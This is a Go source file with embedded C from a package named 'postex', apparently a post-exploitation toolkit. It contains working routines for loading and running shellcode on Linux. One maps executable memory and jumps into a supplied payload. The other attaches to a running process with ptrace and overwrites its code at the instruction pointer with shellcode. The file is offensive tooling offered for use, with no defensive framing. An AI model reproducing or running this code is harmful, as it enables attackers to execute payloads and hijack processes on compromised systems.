// +build linux
// +build cgo

package postex
//Contains functions for loading and executing shellcode.
//Credit to s3my0n for the original C shellcode caller.
//Credit to 0x00pf for the original C shellcode injector.

/*
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

#if defined(__x86_64)
#define REG_IP_NAME      "rip"
#define REG_IP_TYPE      unsigned long
#define REG_IP_FMT       "lu"
#define REG_IP_HEX       "lx"
#define REG_IP_VALUE(r)  ((r).rip)

#elif defined(__i386)
#define REG_IP_NAME      "eip"
#define REG_IP_TYPE      unsigned long
#define REG_IP_FMT       "lu"
#define REG_IP_HEX       "lx"
#define REG_IP_VALUE(r)  ((r).eip)

#endif

void s3my0n_caller(char *shellcode, size_t sclen) {
	void *ptr = mmap(0, sclen, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
	if (ptr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}
	memcpy(ptr, shellcode, sclen);
	(*(void(*) ()) ptr)();
}

void inject_caller(char *shellcode, size_t sclen, pid_t pid) {
	struct user_regs_struct regs;
	int result = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
	if (result < 0) { exit(1); }
	wait(NULL);
	result = ptrace(PTRACE_GETREGS, pid, NULL, &regs);
	if (result < 0) { exit(1); }

	int i;
	uint32_t *s = (uint32_t *) shellcode;
	uint32_t *d = (uint32_t *) REG_IP_VALUE(regs);
	
	for (i=0; i < sclen; i+=4, s++, d++) {
		result = ptrace(PTRACE_POKETEXT, pid, d, *s);
		if (result < 0) { exit(1); }
	}
}
*/
import "C"
import "unsafe"

// Spawn a new process and load some shellcode into it.

func ShellcodeLinux(sc []byte) error {
	C.s3my0n_caller((*C.char)(unsafe.Pointer(&sc[0])), (C.size_t)(len(sc)))
	return nil
}

// Inject shellcode into an existing process.

func ShellcodeInjectLinux(sc []byte, pid int) error {
	C.inject_caller((*C.char)(unsafe.Pointer(&sc[0])), (C.size_t)(len(sc)), (C.pid_t)(pid))
	return nil
}
